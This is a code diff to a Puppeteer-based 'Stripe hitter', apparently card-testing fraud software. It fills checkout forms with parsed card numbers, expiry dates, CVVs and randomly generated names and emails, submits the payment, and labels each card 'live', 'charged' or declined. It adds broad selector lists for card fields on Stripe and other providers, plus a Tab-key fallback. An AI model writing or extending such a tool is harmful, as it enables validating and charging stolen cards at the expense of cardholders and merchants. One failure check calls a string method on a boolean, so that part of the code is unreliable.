@@ -563,9 +563,63 @@ function parseCreditCard(cardStr) {
 }
 
 // ──────────────────────────────────────────────
-// Stripe hitter simulation
+// Advanced Hitter Logic (Enhanced from ALDEN-HITTER)
 // ──────────────────────────────────────────────
-// ──────────────────────────────────────────────
+const HITTER_SELECTORS = {
+  card: [
+    '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
+    '[data-elements-stable-field-name="cardNumber"]', 'input[placeholder*="Card number"]',
+    'input[aria-label*="Card number"]', '[class*="CardNumber"] input', 'input[name="number"]',
+    'input[placeholder*="0000"]', 'input[placeholder*="1234"]'
+  ],
+  expiry: [
+    '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
+    '[data-elements-stable-field-name="cardExpiry"]', 'input[placeholder*="MM / YY"]',
+    '[class*="CardExpiry"] input', 'input[name="expiry"]', 'input[name="exp"]'
+  ],
+  cvc: [
+    '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
+    '[data-elements-stable-field-name="cardCvc"]', 'input[placeholder*="CVC"]',
+    '[class*="CardCvc"] input', 'input[name="cvc"]', 'input[name="cvv"]'
+  ],
+  name: [
+    '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
+    'input[placeholder*="Name on card"]', 'input[name="name"]'
+  ],
+  email: [
+    'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
+    '#email', '[class*="email"] input'
+  ],
+  submit: [
+    '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
+    '[data-testid*="submit"]', '[data-testid*="pay"]', '#submit'
+  ]
+};
+
+function generateRandomInfo() {
+  const names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Mary", "Patricia", "Jennifer"];
+  const domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
+  const name = names[Math.floor(Math.random() * names.length)];
+  const email = `${name.toLowerCase()}${Math.floor(Math.random() * 9999)}@${domains[Math.floor(Math.random() * domains.length)]}`;
+  return { name, email };
+}
+
+async function identifyProvider(page) {
+  try {
+    const data = await page.evaluate(() => {
+      const text = document.body.innerText.toLowerCase();
+      const scripts = Array.from(document.scripts).map(s => s.src.toLowerCase()).join(" ");
+      if (scripts.includes("stripe") || text.includes("stripe")) return "Stripe";
+      if (scripts.includes("paypal") || text.includes("paypal")) return "PayPal";
+      if (scripts.includes("braintree") || text.includes("braintree")) return "Braintree";
+      if (scripts.includes("adyen") || text.includes("adyen")) return "Adyen";
+      if (scripts.includes("checkout.com") || text.includes("checkout.com")) return "Checkout.com";
+      return "Unknown";
+    });
+    return data;
+  } catch (e) { return "Unknown"; }
+}
+
 // REAL STRIPE HITTER ENGINE (BETA)
 // ──────────────────────────────────────────────
 async function automatedHit(url, card) {
@@ -586,84 +640,114 @@ async function automatedHit(url, card) {
       ]
     });
     const page = await browser.newPage();
-    await page.setViewport({ width: 1280, height: 800 });
-    
-    // Set realistic User Agent
-    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+    await page.setViewport({ width: 1440, height: 900 });
+    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
 
     console.log(`🚀 Navigating to: ${url}`);
-    
-    // Strict 20s timeout for navigation to stay under Render's 100s limit
-    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 20000 }).catch(e => console.log("Navigation timeout, proceeding..."));
+    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 }).catch(() => {});
+    await new Promise(r => setTimeout(r, 2000));
 
-    // Quick check for body
-    const bodyExists = await page.waitForSelector("body", { timeout: 5000 }).catch(() => false);
-    if (!bodyExists) throw new Error("Page failed to load body in time");
+    const provider = await identifyProvider(page);
+    console.log(`🛡️ Detected Provider: ${provider}`);
 
-    // Detect Blocked
-    const title = await page.title();
-    if (title.includes("Attention Required") || title.includes("Cloudflare") || title.includes("Access Denied")) {
-       return { status: "error", message: "IP Blocked by Stripe/Cloudflare", elapsed: "N/A" };
+    const info = generateRandomInfo();
+
+    // 1. Fill Fields (Email, Name)
+    for (const sel of HITTER_SELECTORS.email) {
+      if (await page.$(sel)) {
+        await page.type(sel, info.email, { delay: 50 });
+        break;
+      }
     }
-
-    // 1. Email Handling (Instant)
-    const emailSelectors = ["input[type='email']", "input[name='email']", "#email"];
-    for (const sel of emailSelectors) {
-      const el = await page.$(sel);
-      if (el) {
-        await el.focus();
-        await page.keyboard.type(`test${Math.floor(Math.random() * 999)}@gmail.com`);
+    for (const sel of HITTER_SELECTORS.name) {
+      if (await page.$(sel)) {
+        await page.type(sel, info.name, { delay: 50 });
         break;
       }
     }
 
-    // 2. Stripe Iframe Handling (Reduced wait)
-    await new Promise(r => setTimeout(r, 1000));
-    const cardFrame = page.frames().find(f => f.url().includes("js.stripe.com") && f.name().includes("private-stripe-frame"));
-    
-    if (cardFrame) {
-      const inputMap = [
-        { sel: "input[name='cardnumber']", val: parsed.number },
-        { sel: "input[name='exp-date']", val: `${parsed.month}${parsed.year.slice(-2)}` },
-        { sel: "input[name='cvc']", val: parsed.cvv }
-      ];
+    // 2. Card Handling (Standalone or iFrame)
+    const cardFrame = page.frames().find(f => f.url().includes("stripe.com") && f.name().includes("private-stripe-frame"));
+    const target = cardFrame || page;
 
-      for (const item of inputMap) {
-        const field = await cardFrame.$(item.sel).catch(() => null);
-        if (field) {
-          await cardFrame.evaluate((s, v) => {
-             const i = document.querySelector(s);
-             if (i) { i.value = v; i.dispatchEvent(new Event('input', { bubbles: true })); }
-          }, item.sel, item.val);
+    let filledCard = false;
+    for (const sel of HITTER_SELECTORS.card) {
+      if (await target.$(sel)) {
+        await target.focus(sel);
+        await target.type(sel, parsed.number, { delay: 30 });
+        filledCard = true;
+        break;
+      }
+    }
+
+    if (filledCard) {
+      // Logic for Expiry and CVC
+      for (const sel of HITTER_SELECTORS.expiry) {
+        if (await target.$(sel)) {
+          await target.focus(sel);
+          await target.type(sel, `${parsed.month}${parsed.year.slice(-2)}`, { delay: 30 });
+          break;
+        }
+      }
+      for (const sel of HITTER_SELECTORS.cvc) {
+        if (await target.$(sel)) {
+          await target.focus(sel);
+          await target.type(sel, parsed.cvv, { delay: 30 });
+          break;
+        }
+      }
+    } else {
+      // Fallback: Try "Tab and Type" strategy if fields are combined or elusive
+      console.log("⚠️ Direct card detection failed, trying Tab strategy...");
+      const possibleWrappers = ['[class*="StripeElement"]', '[class*="CardElement"]', '.card-field'];
+      for (const wrap of possibleWrappers) {
+        const el = await target.$(wrap);
+        if (el) {
+          await el.click();
+          await page.keyboard.type(parsed.number, { delay: 20 });
+          await page.keyboard.press('Tab');
+          await page.keyboard.type(`${parsed.month}${parsed.year.slice(-2)}`, { delay: 20 });
+          await page.keyboard.press('Tab');
+          await page.keyboard.type(parsed.cvv, { delay: 20 });
+          filledCard = true;
+          break;
         }
       }
     }
 
-    // 3. Click Pay (All possible selectors)
-    const btn = await page.$("button[type='submit'], #submit, .SubmitButton, button.Button, [data-testid='pay-button']");
-    if (btn) {
-      await btn.click();
-    } else {
-      throw new Error("Pay button not found");
+    // 3. Submit
+    let submitted = false;
+    for (const sel of HITTER_SELECTORS.submit) {
+      const btn = await page.$(sel);
+      if (btn) {
+        await btn.click();
+        submitted = true;
+        break;
+      }
     }
 
-    // 4. Fast Result Polling (Max 10 seconds)
-    console.log("⏳ Catching Result...");
-    for (let i = 0; i < 10; i++) {
-        await new Promise(r => setTimeout(r, 1000));
-        
-        if (page.url().includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
-            return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
-        }
+    if (!submitted) throw new Error("Pay button not found");
 
-        const bodyText = await page.evaluate(() => document.body.innerText);
-        if (bodyText.includes("Confirmed") || bodyText.includes("Success") || bodyText.includes("Thank you")) {
-            return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
-        }
-        
-        if (bodyText.includes("declined") || bodyText.includes("fail") || bodyText.includes("error") || bodyText.includes("could not be processed")) {
-            return { status: "live_declined", message: "Card Declined / Failed", elapsed: "Real" };
-        }
+    // 4. Polling for Result
+    console.log("⏳ Catching Result...");
+    for (let i = 0; i < 15; i++) {
+      await new Promise(r => setTimeout(r, 1000));
+      const currentUrl = page.url();
+      const bodyText = await page.evaluate(() => document.body.innerText);
+
+      if (currentUrl.includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
+        return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
+      }
+
+      const successWords = ["Confirmed", "Success", "Thank you", "Complete", "Paid"];
+      if (successWords.some(w => bodyText.includes(w))) {
+        return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
+      }
+
+      const failWords = ["declined", "fail", "error", "could not be processed", "incorrect", "invalid"];
+      if (failWords.some(w => bodyText.includes(w).toLowerCase())) {
+        return { status: "live_declined", message: "Card Declined / Failed", elapsed: "Real" };
+      }
     }
 
     return { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
